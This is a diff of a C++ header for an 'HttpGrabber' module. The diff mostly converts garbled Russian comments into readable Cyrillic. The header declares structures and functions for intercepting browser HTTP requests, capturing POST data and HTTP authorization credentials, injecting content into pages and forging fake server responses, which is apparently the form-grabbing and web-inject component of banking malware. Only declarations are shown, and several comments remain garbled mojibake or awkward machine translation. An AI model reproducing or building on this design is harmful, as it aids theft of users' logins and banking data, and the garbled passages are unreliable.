@@ -1,5 +1,5 @@
 /*
-  РћР±С‰РёРё С„СѓРЅРєС†РёРё РґР»СЏ РіСЂР°Р±Р±РёРЅРіР° HTTP.
+  Общии функции для граббинга HTTP.
 */
 #pragma once
 
@@ -46,36 +46,36 @@ namespace HttpGrabber
   typedef struct
   {    
     /*
-      Р¤Р»Р°РіРё.
+      Флаги.
     */
     DWORD flags;
     
     /*
-      IN РќРµРєРёР№ С…СЌРЅРґР» Р·Р°РїСЂРѕСЃР° (Р·Р°РІРёСЃРёС‚ РѕС‚ РїРµСЂРµС…РІР°С‚С‹РІР°РµРјРѕР№ Р±РёР±Р»РёРѕС‚РµРєРё).
+      IN Некий хэндл запроса (зависит от перехватываемой библиотеки).
     */
     void *handle;
     
     /*
-      IN URL. Р’С‹РґРµР»СЏРµС‚СЃСЏ С‡РµСЂРµР· Mem.
+      IN URL. Выделяется через Mem.
       
-      РћСЃРІРѕР±РѕР¶РґР°РµС‚СЃСЏ С‡РµСЂРµР· _freeRequestData().
+      Освобождается через _freeRequestData().
     */
     LPSTR url;
 
     /*
-      IN РљРѕР». Р±Р°Р№С‚ РІ URL, РёСЃРєР»СЋС‡Р°СЏ РЅСѓР»РµРІРµРѕР№ Р±Р°Р№С‚.
+      IN Кол. байт в URL, исключая нулевеой байт.
     */
     DWORD urlSize;
 
     /*
-      IN Р РµС„РµСЂРµСЂ.
+      IN Реферер.
       
-      РћСЃРІРѕР±РѕР¶РґР°РµС‚СЃСЏ С‡РµСЂРµР· _freeRequestData().
+      Освобождается через _freeRequestData().
     */
     LPSTR referer;
 
     /*
-      IN РљРѕР». Р±Р°Р№С‚ РІ СЂРµС„РµСЂРµСЂРµСЂРµ, РёСЃРєР»СЋС‡Р°СЏ РЅСѓР»РµРІРµРѕР№ Р±Р°Р№С‚.
+      IN Кол. байт в реферерере, исключая нулевеой байт.
     */
     DWORD refererSize;
 
@@ -85,31 +85,31 @@ namespace HttpGrabber
     BYTE verb;
 
     /*
-      IN РўРёРї РєРѕРЅС‚РµРЅС‚Р°, С‚.Рµ. С‚РёРї POST-РґР°РЅРЅС‹С….
+      IN Тип контента, т.е. тип POST-данных.
       
-      РћСЃРІРѕР±РѕР¶РґР°РµС‚СЃСЏ С‡РµСЂРµР· _freeRequestData().
+      Освобождается через _freeRequestData().
     */
     LPSTR contentType;
 
     /*
-      IN Р Р°Р·РјРµСЂ contentTypeSize.
+      IN Размер contentTypeSize.
     */
     DWORD contentTypeSize;
 
     /*
-      IN OUT POST-РґР°РЅРЅС‹Рµ (РјРѕРіСѓС‚ РЅРµ РєРѕРЅС‡Р°С‚СЃСЊСЏ РЅР° 0). Р•СЃР»Рё РІРѕР·СЂР°С‰РµРЅ С„Р»Р°Рі
-      ANALIZEFLAG_POSTDATA_REPLACED,РґР°РЅРЅС‹Рµ Р±СѓРґСѓС‚ РїРѕРґРјРµРЅРµРЅС‹ РЅР° РЅРѕРІС‹Рµ РґР°РЅРЅС‹Рµ, РєРѕС‚РѕСЂС‹Рµ РЅСѓР¶РЅРѕ
-      РѕСЃРІРѕР±РѕРґРёС‚СЊ С‡РµСЂРµР· Mem РїРѕСЃР»Рµ РѕС‚РїСЂР°РІРєРё Р·Р°РїСЂРѕСЃР°.
+      IN OUT POST-данные (могут не кончатсья на 0). Если возращен флаг
+      ANALIZEFLAG_POSTDATA_REPLACED,данные будут подменены на новые данные, которые нужно
+      освободить через Mem после отправки запроса.
     */
     void *postData;
 
     /*
-      IN OUT Р Р°Р·РјРµСЂ postData. Р—РЅР°С‡РµРЅРёРµ РЅРµ РґРѕР»Р¶РЅРѕ РїСЂРµРІС‹С‰Р°С‚СЊ MAX_POSTDATA_SIZE.
+      IN OUT Размер postData. Значение не должно превыщать MAX_POSTDATA_SIZE.
     */
     DWORD postDataSize;
 
     /*
-      IN Р”Р°РЅРЅС‹Рµ HTTP-Р°РІС‚РѕСЂРёР·Р°С†РёРё.
+      IN Данные HTTP-авторизации.
     */
     struct 
     {
@@ -119,30 +119,30 @@ namespace HttpGrabber
     }authorizationData;
 
     /*
-      OUT РЎРїРёСЃРѕРє РёРЅР¶РµРєС‚РѕРІ, Р°РєС‚СѓР°Р»СЊРЅРѕ С‚РѕР»СЊРєРѕ РїСЂРё ANALIZEFLAG_URL_INJECT. 
+      OUT Список инжектов, актуально только при ANALIZEFLAG_URL_INJECT. 
 
-      РћСЃРІРѕР±РѕР¶РґР°РµС‚СЃСЏ С‡РµСЂРµР· _freeInjectFullDataList().
+      Освобождается через _freeInjectFullDataList().
     */
     INJECTFULLDATA *injects;
 
     /*
-      OUT Р Р°Р·РјРµСЂ РјР°СЃСЃРёРІР° injectData.
+      OUT Размер массива injectData.
     */
     DWORD injectsCount;
 
     /*
-      IN РўРµРєСѓС‰Р°СЏ РєРѕРЅС„РёРіСѓСЂР°С†РёСЏ. NULL, РµСЃР»Рё РЅРµ СЃСѓС‰РµС‚РІСѓРµС‚. Р”Р°РЅРЅР°СЏ РєРѕРЅС„РёРіСѓСЂР°С†РёСЏ РґРѕСЃС‚СѓРїРЅР° С‚РѕР»СЊРєРѕ РґР»СЏ
-      С‡С‚РµРЅРёСЏ.
+      IN Текущая конфигурация. NULL, если не сущетвует. Данная конфигурация доступна только для
+      чтения.
 
-      РћСЃРІРѕР±РѕР¶РґР°РµС‚СЃСЏ С‡РµСЂРµР· _freeRequestData().
+      Освобождается через _freeRequestData().
     */
     BinStorage::STORAGE *dynamicConfig;
 
     /*
-      IN РўРµРєСѓС‰Р°СЏ Р»РѕРєР°Р»СЊРЅР°СЏ РєРѕРЅС„РёРіСѓСЂР°С†РёСЏ. NULL, РµСЃР»Рё РЅРµ СЃСѓС‰РµС‚РІСѓРµС‚. Р”Р°РЅРЅР°СЏ РєРѕРЅС„РёРіСѓСЂР°С†РёСЏ РґРѕСЃС‚СѓРїРЅР°
-      С‚РѕР»СЊРєРѕ РґР»СЏ С‡С‚РµРЅРёСЏ.
+      IN Текущая локальная конфигурация. NULL, если не сущетвует. Данная конфигурация доступна
+      только для чтения.
 
-      РћСЃРІРѕР±РѕР¶РґР°РµС‚СЃСЏ С‡РµСЂРµР· _freeRequestData().
+      Освобождается через _freeRequestData().
     */
     BinStorage::STORAGE *localConfig;
   }REQUESTDATA;
@@ -156,7 +156,7 @@ namespace HttpGrabber
     
     ANALIZEFLAG_URL_INJECT          = 0x02, //Action. The data on inzheyt / fake.
 
-    ANALIZEFLAG_POSTDATA_REPLACED   = 0x04, //Р вЂќР ВµР в„–РЎРѓРЎвЂљР Р†Р С‘Р Вµ. Р СњР С•Р Р†РЎвЂ№Р Вµ POST-Р Т‘Р В°Р Р…Р Р…РЎвЂ№Р Вµ РЎРѓР С•РЎвЂ¦РЎР‚Р В°Р Р…Р ВµР Р…РЎвЂ№ Р Р† REQUESTDATA.postData.
+    ANALIZEFLAG_POSTDATA_REPLACED   = 0x04, //Р”РµР№СЃС‚РІРёРµ. РќРѕРІС‹Рµ POST-РґР°РЅРЅС‹Рµ СЃРѕС…СЂР°РЅРµРЅС‹ РІ REQUESTDATA.postData.
 
 
     ANALIZEFLAG_SAVED_REPORT        = 0x08, //Information. Query is stored in the report.
@@ -167,184 +167,184 @@ namespace HttpGrabber
   };
 
   /*
-    РРЅРёС†РёР°Р»РёР·Р°С†РёСЏ.
+    Инициализация.
   */
   void init(void);
 
   /*
-    Р”РµРёРЅРёС†РёР°Р»РёР·Р°С†РёСЏ.
+    Деинициализация.
   */
   void uninit(void);
 
   /*
-    Р“РµСЂРµРЅР°С†РёСЏ РїСѓС‚Рё РґР»СЏ С„РµР№РєР° РёСЃРїРѕР»СЊР·СѓСЏ С‡Р°СЃС‚СЊ РѕСЂРёРіР°РЅР»СЊРЅРѕРѕР№ URL РЅР° РѕСЃРЅРѕРІРµ РµРµ РјР°СЃРєРё (РєСЂСѓС‚РѕРµ РїСЂРµРґР»РѕР¶РµРЅРёРµ РґР°? ;))
+    Геренация пути для фейка используя часть ориганльноой URL на основе ее маски (крутое предложение да? ;))
 
-    IN fakeUrl     - С„РµР№РєРѕРІР°СЏ URL, РєРѕС‚РѕСЂРѕР№ Р±СѓРґРµС‚ РґРѕР°Р±РІР»РµРЅР° С‡Р°СЃС‚СЊ РёР· originalUrl.
-    IN originalUrl - РѕСЂРёРіРёРЅР°Р»СЊРЅР°СЏ URL, РєРѕС‚РѕСЂР°СЏ СЃРѕРІРїР°Р»Р° СЃ РјР°СЃРєРѕР№ urlMask.
-    IN urlMask     - urlMask РјР°СЃРєР° URL, РІ РєРѕС‚РѕСЂРѕР№ РѕР±СЏР·Р°С‚РµР»СЊРЅРѕ РґРѕР»Р¶РµРЅ РїСЂРёСЃСѓС‚РІРѕРІР°С‚СЊ СЃРёРјРІРѕР» '/'.
+    IN fakeUrl     - фейковая URL, которой будет доабвлена часть из originalUrl.
+    IN originalUrl - оригинальная URL, которая совпала с маской urlMask.
+    IN urlMask     - urlMask маска URL, в которой обязательно должен присутвовать символ '/'.
 
-    Return         - РїРѕР»РЅС‹Р№ URL С„РµР№РєР° (РЅСѓР¶РЅРѕ СѓРґР°Р»РёС‚СЊ С‡РµСЂРµР· Mem),
-                     NULL - РІ СЃР»СѓС‡Р°Рё РѕС€РёР±РєРё.
+    Return         - полный URL фейка (нужно удалить через Mem),
+                     NULL - в случаи ошибки.
   */
   LPSTR _genarateMirrorFakeUrlA(const LPSTR fakeUrl, const LPSTR originalUrl, const LPSTR urlMask);
   
   /*
-    РќР°РґСЃС‚СЂРѕР№РєР° РЅР°Рґ Str::matchA() РґР»СЏ URL.
+    Надстройка над Str::matchA() для URL.
 
-    IN mask     - РјР°СЃРєР°.
+    IN mask     - маска.
     IN url      - URL.
-    IN urlSize  - СЂР°Р·РјРµСЂ URL.
-    IN advFlags - РґРѕРїРѕР»РЅРёС‚РµР»СЊРЅС‹Рµ С„Р»Р°РіРё Str::MATCH_*.
+    IN urlSize  - размер URL.
+    IN advFlags - дополнительные флаги Str::MATCH_*.
 
-    Return - true  - СЃРѕРІРїР°РґРµРЅРёРµ РЅР°Р№РґРµРЅРѕ,
-             false - СЃРѕРІРїР°РґРµРЅРёРµ РЅРµ РЅР°Р№РґРµРЅРѕ.
+    Return - true  - совпадение найдено,
+             false - совпадение не найдено.
   */
   bool _matchUrlA(const LPSTR mask, const LPSTR url, DWORD urlSize, DWORD advFlags);
 
   /*
-    РќР°РґСЃС‚СЂРѕР№РєР° РЅР°Рґ Str::matchA() РґР»СЏ POST-РґР°РЅРЅС‹С….
+    Надстройка над Str::matchA() для POST-данных.
 
-    IN mask         - РјР°СЃРєР°.
-    IN postData     - POST-РґР°РЅРЅС‹Рµ.
-    IN postDataSize - СЂР°Р·РјРµСЂ POST-РґР°РЅРЅС‹С….
+    IN mask         - маска.
+    IN postData     - POST-данные.
+    IN postDataSize - размер POST-данных.
 
-    Return          - true  - СЃРѕРІРїР°РґРµРЅРёРµ РЅР°Р№РґРµРЅРѕ,
-                      false - СЃРѕРІРїР°РґРµРЅРёРµ РЅРµ РЅР°Р№РґРµРЅРѕ.
+    Return          - true  - совпадение найдено,
+                      false - совпадение не найдено.
   */
   bool _matchPostDataA(const LPSTR mask, const LPSTR postData, DWORD postDataSize);
   
   /*
-    РќР°РґСЃС‚СЂРѕР№РєР° РЅР°Рґ Str::matchA() РґР»СЏ С‚РµРєСЃС‚РѕРІРѕРіРѕ СЃРѕРґРµСЂР¶РёРјРѕРіРѕ.
+    Надстройка над Str::matchA() для текстового содержимого.
 
-    IN mask        - РјР°СЃРєР°.
-    IN context     - СЃРѕРґРµСЂР¶РёРјРѕРµ.
-    IN contextSize - СЂР°Р·РјРµСЂ СЃРѕРґРµСЂР¶РёРјРѕРіРѕ.
-    IN advFlags    - РґРѕРїРѕР»РЅРёС‚РµР»СЊРЅС‹Рµ С„Р»Р°РіРё Str::MATCH_*.
+    IN mask        - маска.
+    IN context     - содержимое.
+    IN contextSize - размер содержимого.
+    IN advFlags    - дополнительные флаги Str::MATCH_*.
 
-    Return         - true  - СЃРѕРІРїР°РґРµРЅРёРµ РЅР°Р№РґРµРЅРѕ,
-                     false - СЃРѕРІРїР°РґРµРЅРёРµ РЅРµ РЅР°Р№РґРµРЅРѕ.
+    Return         - true  - совпадение найдено,
+                     false - совпадение не найдено.
   */
   bool _matchContextA(const LPSTR mask, const void *context, DWORD contextSize, DWORD advFlags);
 
   /*
-    РќР°РґСЃС‚СЂРѕР№РєР° РЅР°Рґ Str::matchA() РґР»СЏ С‚РµРєСЃС‚РѕРІРѕРіРѕ СЃРѕРґРµСЂР¶РёРјРѕРіРѕ.
+    Надстройка над Str::matchA() для текстового содержимого.
 
-    IN mask         - РјР°СЃРєР°.
-    IN maskSize     - СЂР°Р·РјРµСЂ РјР°СЃРєРё.
-    IN context      - СЃРѕРґРµСЂР¶РёРјРѕРµ.
-    IN contextSize  - СЂР°Р·РјРµСЂ СЃРѕРґРµСЂР¶РёРјРѕРіРѕ.
-    OUT offsetBegin - РѕС„С„СЃРµС‚ РЅР°С‡Р°Р»Р° РґРµР№СЃС‚РІРёСЏ РјР°СЃРєРё РІ context. РњРѕР¶РµС‚ Р±С‹С‚СЊ NULL.
-    OUT offsetEnd   - РѕС„С„СЃРµС‚ РєРѕРЅС†Р° РґРµР№СЃС‚РІРёСЏ РјР°СЃРєРё РІ context. РњРѕР¶РµС‚ Р±С‹С‚СЊ NULL.
-    IN advFlags     - РґРѕРїРѕР»РЅРёС‚РµР»СЊРЅС‹Рµ С„Р»Р°РіРё Str::MATCH_*.
+    IN mask         - маска.
+    IN maskSize     - размер маски.
+    IN context      - содержимое.
+    IN contextSize  - размер содержимого.
+    OUT offsetBegin - оффсет начала действия маски в context. Может быть NULL.
+    OUT offsetEnd   - оффсет конца действия маски в context. Может быть NULL.
+    IN advFlags     - дополнительные флаги Str::MATCH_*.
 
-    Return          - true  - СЃРѕРІРїР°РґРµРЅРёРµ РЅР°Р№РґРµРЅРѕ,
-                      false - СЃРѕРІРїР°РґРµРЅРёРµ РЅРµ РЅР°Р№РґРµРЅРѕ.
+    Return          - true  - совпадение найдено,
+                      false - совпадение не найдено.
   */
   bool _matchContextExA(const void *mask, DWORD maskSize, const void *context, DWORD contextSize, LPDWORD offsetBegin, LPDWORD offsetEnd, DWORD advFlags);
 
   /*
-    Р”РѕР±Р°РІР»РµРЅРёРµ СЌР»РµРјРµРЅС‚Р° РІ СЃРїРёСЃРѕРє URL.
+    Добавление элемента в список URL.
 
-    IN listId          - С‚РёРї СЃРїРёСЃРєР° LocalConfig::ITEM_URLLIST_*.
-    IN OUT localConfig - Р»РѕРєР°Р»СЊРЅР°СЏ РєРѕРЅС„РёРіСѓСЂР°С†РёСЏ.
-    IN urlMask         - РјР°СЃРєР° URL.
+    IN listId          - тип списка LocalConfig::ITEM_URLLIST_*.
+    IN OUT localConfig - локальная конфигурация.
+    IN urlMask         - маска URL.
 
-    Return             - true - РІ СЃР»СѓС‡Р°Рё СѓСЃРїРµС…Р°,
-                         false - РІ СЃР»СѓС‡Р°Рё РѕС€РёР±РєРё.
+    Return             - true - в случаи успеха,
+                         false - в случаи ошибки.
 
   */
   bool _addUrlMaskToList(DWORD listId, BinStorage::STORAGE **localConfig, const LPSTR urlMask);
   
   /*
-    РЈРґР°Р»РµРЅРёРµ СЌР»РµРјРµРЅС‚Р° РёР· СЃРїРёСЃРѕРє URL.
+    Удаление элемента из список URL.
 
-    IN listId          - С‚РёРї СЃРїРёСЃРєР° LocalConfig::ITEM_URLLIST_*.
-    IN OUT localConfig - Р»РѕРєР°Р»СЊРЅР°СЏ РєРѕРЅС„РёРіСѓСЂР°С†РёСЏ.
-    IN maskOfurlMask   - РјР°СЃРєР° РјР°СЃРєРё URL.
+    IN listId          - тип списка LocalConfig::ITEM_URLLIST_*.
+    IN OUT localConfig - локальная конфигурация.
+    IN maskOfurlMask   - маска маски URL.
 
-    Return             - true - РІ СЃР»СѓС‡Р°Рё СѓСЃРїРµС…Р°,
-                         false - РІ СЃР»СѓС‡Р°Рё РѕС€РёР±РєРё.
+    Return             - true - в случаи успеха,
+                         false - в случаи ошибки.
 
   */
   bool _removeUrlMaskFromList(DWORD listId, BinStorage::STORAGE **localConfig, const LPSTR maskOfurlMask);
   
   /*
-    РџСЂРѕРІРµСЂРєР° РЅР°С…РѕРґРёС‚СЊСЃСЏ Р»Рё URL РІ СЃРїРёСЃРєРµ.
+    Проверка находиться ли URL в списке.
 
-    IN listId      - С‚РёРї СЃРїРёСЃРєР° LocalConfig::ITEM_URLLIST_*.
-    IN localConfig - Р»РѕРєР°Р»СЊРЅР°СЏ РєРѕРЅС„РёРіСѓСЂР°С†РёСЏ.
+    IN listId      - тип списка LocalConfig::ITEM_URLLIST_*.
+    IN localConfig - локальная конфигурация.
     IN url         - URL.
-    IN urlSize     - СЂР°Р·РјРµСЂ URL.
-    IN advFlags    - РґРѕРїРѕР»РЅРёС‚РµР»СЊРЅС‹Рµ С„Р»Р°РіРё Str::MATCH_*.
+    IN urlSize     - размер URL.
+    IN advFlags    - дополнительные флаги Str::MATCH_*.
 
-    Return         - true - URL РЅР°Р№РґРµРЅР°,
-                     false - URL РЅРµ РЅР°Р№РґРµРЅР°.
+    Return         - true - URL найдена,
+                     false - URL не найдена.
   */
   bool _isUrlInList(DWORD listId, const BinStorage::STORAGE *localConfig, const LPSTR url, DWORD urlSize, DWORD advFlags);
   
   /*
-    РђРЅР°Р»РёР· URL, Рё СѓСЃС‚Р°РЅРѕРІРєР° СЃРѕРѕС‚РІРµС‚РІСѓСЋС‰РёС… Р·Р°РґР°С‡ РґР»СЏ РЅРµРµ.
+    Анализ URL, и установка соответвующих задач для нее.
 
-    IN OUT requestData - РґР°РЅРЅС‹Рµ Р·Р°РїСЂРѕСЃР°.
+    IN OUT requestData - данные запроса.
     
     Return             - ANALIZEFLAG_*.
   */
   DWORD analizeRequestData(REQUESTDATA *requestData);
 
   /*
-    РСЃРїРѕР»РЅРµРЅРёРµ РёРЅР¶РµРєС‚РѕРІ РІ РєРѕРЅС‚РµРєСЃС‚Рµ.
+    Исполнение инжектов в контексте.
 
     IN url             - URL.
-    IN OUT context     - РєРѕРЅС‚РµРєСЃС‚ РґР»СЏ РёР·РјРµРЅРµРЅРёСЏ.
-    IN OUT contextSize - СЂР°Р·РјРµСЂ РєРѕРЅС‚РµРєСЃС‚Р°.
-    IN dataList        - СЃРїРёСЃРѕРє РёРЅР¶РµРєС‚РѕРІ.
-    IN count           - РєРѕР». РёРЅР¶РµРєС‚РѕРІ.
+    IN OUT context     - контекст для изменения.
+    IN OUT contextSize - размер контекста.
+    IN dataList        - список инжектов.
+    IN count           - кол. инжектов.
 
-    Return             - true - РІ РєРѕРЅРµРєСЃС‚ Р±С‹Р»Рё РІРЅРµСЃРµРЅС‹ РёР·РјРµРЅРµРЅРёСЏ,
-                         false - РёР·РјРµРЅРµРЅРёСЏ РЅРµ Р±С‹Р»Рё РІРЅРµСЃРµРЅС‹ (РЅРµ РѕР·РЅР°С‡Р°РµС‚ РѕС€РёР±РєСѓ).
+    Return             - true - в конекст были внесены изменения,
+                         false - изменения не были внесены (не означает ошибку).
   */
   bool _executeInjects(const LPSTR url, LPBYTE *context, LPDWORD contextSize, const INJECTFULLDATA *dataList, DWORD count);
 
   /*
-    РџСЂРѕРІРµСЂСЏРµС‚, СЏРІР»СЏРµС‚СЃСЏ Р»Рё РјР°СЃСЃРёРІ С„РµР№РєРѕРј.
+    Проверяет, является ли массив фейком.
 
-    IN dataList - РјР°СЃСЃРёРІ.
-    IN count    - СЂР°Р·РјРµСЂ РјР°СЃСЃРёРІР°.
+    IN dataList - массив.
+    IN count    - размер массива.
 
-    Return      - true - СЏРІР»СЏРµС‚СЃСЏ,
-                  false - РЅРµ СЏРІР»СЏРµС‚СЃСЏ.
+    Return      - true - является,
+                  false - не является.
   */
   bool _isFakeData(INJECTFULLDATA *dataList, DWORD count);
   
   /*
-    РћСЃРІРѕР±РѕР¶РґРµРЅРёРµ РІСЃРµС… РґР°РЅРЅС‹С… REQUESTDATA РІС‹РґРµР»РµСЏРµРјС‹С… С‡РµСЂРµР· Mem.
+    Освобождение всех данных REQUESTDATA выделеяемых через Mem.
 
-    IN OUT requestData - СЃС‚СЂСѓРєС‚СѓСЂР°.
+    IN OUT requestData - структура.
   */
   void _freeRequestData(REQUESTDATA *requestData);
 
   /*
-    РћСЃРІРѕР±РѕР¶РґРµРЅРёРµ РІСЃРµС… РґР°РЅРЅС‹С… INJECTFULLDATA РІС‹РґРµР»РµСЏРµРјС‹С… С‡РµСЂРµР· Mem.
+    Освобождение всех данных INJECTFULLDATA выделеяемых через Mem.
 
-    IN OUT data - СЃС‚СЂСѓРєС‚СѓСЂР°.
+    IN OUT data - структура.
   */
   void _freeInjectFullData(INJECTFULLDATA *data);
   
   /*
-    РћСЃРІРѕР±РѕР¶РґРµРЅРёРµ РІСЃРµРіРѕ РјР°СЃСЃРёРІР° INJECTFULLDATA.
+    Освобождение всего массива INJECTFULLDATA.
 
-    IN dataList - РјР°СЃСЃРёРІ.
-    IN count    - СЂР°Р·РјРµСЂ РјР°СЃСЃРёРІР°.
+    IN dataList - массив.
+    IN count    - размер массива.
   */
   void _freeInjectFullDataList(INJECTFULLDATA *dataList, DWORD count);
 
-  /*Р’В Р’В Р’В Р’В Creating a fake response from the server.
+  /*В В В В Creating a fake response from the server.
 
-Р’В Р’В Р’В Р’В IN requestData - data of the original query.
-Р’В Р’В Р’В Р’В IN fakeData - Faika data.
+В В В В IN requestData - data of the original query.
+В В В В IN fakeData - Faika data.
 
-Р’В Р’В Р’В Р’В Return - the handle of the server's response, NULL - otherwise.
-Р’В Р’В */
+В В В В Return - the handle of the server's response, NULL - otherwise.
+В В */
   HINTERNET _createFakeResponse(REQUESTDATA *requestData, INJECTFULLDATA *fakeData);
 };
 #endif
